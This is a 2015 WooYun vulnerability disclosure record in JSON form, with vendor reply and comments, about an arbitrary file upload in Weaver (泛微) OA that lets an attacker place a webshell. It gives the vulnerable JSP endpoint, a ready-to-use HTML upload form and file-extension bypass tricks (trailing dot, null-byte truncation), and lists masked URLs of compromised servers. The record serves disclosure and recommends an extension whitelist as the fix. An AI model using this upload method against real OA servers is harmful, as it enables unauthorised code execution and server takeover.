{"id": 71657, "wybug_id": "wooyun-2015-0137850", "wybug_title": "泛微OA系统通用任意文件上传getshell(附官方案例)", "wybug_corp": "上海泛微软件有限公司", "wybug_author": "路人甲", "wybug_date": "2015-09-03 10:38", "wybug_open_date": "2015-12-05 08:48", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-05：\t细节向公众公开  简要描述： 影响6.0、7.0、7.100及官方使用的8.0。 详细说明：  官方使用的8.0是最新版本，需要登录才可利用，其他版本都不需要登录即可利用。存在漏洞的文件：/page/maint/common/UserResourceUpload.jsp?dir=/dir可随意指定，比如可将shell上传至不登录便可访问的目录里面。构造如下表单：\n<form method='post' action='http://xxxx/page/maint/common/UserResourceUpload.jsp?dir=/'  enctype=\"multipart/form-data\" > <input type=\"file\" id=\"file\" name=\"test\" style=\"height:20px;BORDER: #8F908B 1px solid;\"/><button type=submit value=\"getshell\">getshell</button> </form>\n来完成上传任务。默认可直接上传html、txt等文件，但是不能直接传jsp、JSP文件。进一步测试发现，针对Windows服务器，通过在文件后缀加 . 来生成jsp文件，比如1.jsp.，如此便可上传成功；对linux服务器，通过0x00截断来生成jsp文件。这些绕过方法都是最基础最常用到的，想必大家都不陌生就不多说了。漏洞证明：http://**.**.**.**/login/wooyun.jsp\n\n**.**.**.**:8081/wooyun.jsp\n\nhttp://**.**.**.**/wooyun.jsp\n\nhttp://**.**.**.**:88/wooyun.jsp\n\nhttp://**.**.**.**:9000/**.**.**.**\n\n官方使用的8.0已沦陷，system权限：\n\n   漏洞证明：  参考详细说明。如下案例供漏洞验证。http://**.**.**.**/http://**.**.**.**:801/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**:803/http://**.**.**.**/http://**.**.**.**:805/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**:82/http://**.**.**.**/http://**.**.**.**:6688/   修复方案：  对上传的文件后缀采用白名单机制进行限制。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-09-06 08:46 厂商回复： CNVD确认所述情况,已由CNVD通过以往获知的联系渠道向其邮件通报(未获回应). 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-01 10:41 |    \t\tjust_joker \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:18        | ..........)\t\t \n  6666666    \n     2015-09-01 10:44 |    \t\tShAdow丶 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:13        | i am a fans of kimYeWon.)\t\t \n  mark、    \n     2015-09-01 10:45 |    \t\tVinc \t\t\t( 普通白帽子  |\t\t\t        Rank:124 漏洞数:23        | :))\t\t \n  ..    \n     2015-09-01 10:49 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:658 漏洞数:134        | 290)\t\t \n  6666    \n     2015-09-01 11:04 |    \t\t土夫子 \t\t\t( 普通白帽子  |\t\t\t        Rank:354 漏洞数:64        | 我认真起来，连我自己都害怕。)\t\t \n  66666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}